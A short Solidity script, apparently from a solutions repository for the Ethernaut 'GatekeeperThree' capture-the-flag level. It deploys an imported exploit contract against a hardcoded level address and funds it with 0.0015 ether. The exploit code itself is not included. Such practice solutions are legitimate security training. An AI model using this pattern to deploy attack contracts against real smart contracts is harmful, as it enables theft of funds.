// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IGatekeeperThree.sol";
import "../src/exploits/GatekeeperThreeExploit.sol";

contract SolveLevel28 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x0b0276F85EF92432fBd6529E169D9dE4aD337b1F;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IGatekeeperThree instance = IGatekeeperThree(instanceAddress);
        GatekeeperThreeExploit exploit = new GatekeeperThreeExploit();

        exploit.exploit{value: 0.0015 ether}(instance);
    }
}
